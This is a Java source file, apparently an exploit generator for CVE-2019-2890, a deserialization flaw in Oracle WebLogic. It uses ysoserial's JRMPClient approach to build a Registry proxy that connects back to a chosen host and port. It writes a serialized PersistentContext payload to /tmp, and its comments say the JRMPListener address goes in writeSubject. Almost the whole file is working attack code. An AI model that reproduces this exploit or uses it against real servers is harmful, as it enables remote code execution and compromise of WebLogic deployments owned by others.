package com.weblogcVul;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.wsee.jaxws.persistence.PersistentContext;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;
/*
需要在PersistentContext.writeSubject中指定JRMPListener地址
 */
public class CVE_2019_2890 {
    public static Registry getObject(String command) throws Exception {
        int sep = command.indexOf(58);
        String host;
        int port;
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }

        ObjID id = new ObjID((new Random()).nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), new Class[]{Registry.class}, obj);
        return proxy;
    }
    public static void main(String[] args) throws IOException {
        /*
        需要在PersistentContext.writeSubject中指定JRMPListener地址
         */
        PersistentContext persistentContext = new PersistentContext(null,null,null,null,null);
        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/cve-2019.2890.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(persistentContext);
        objectOutputStream.close();
    }
}
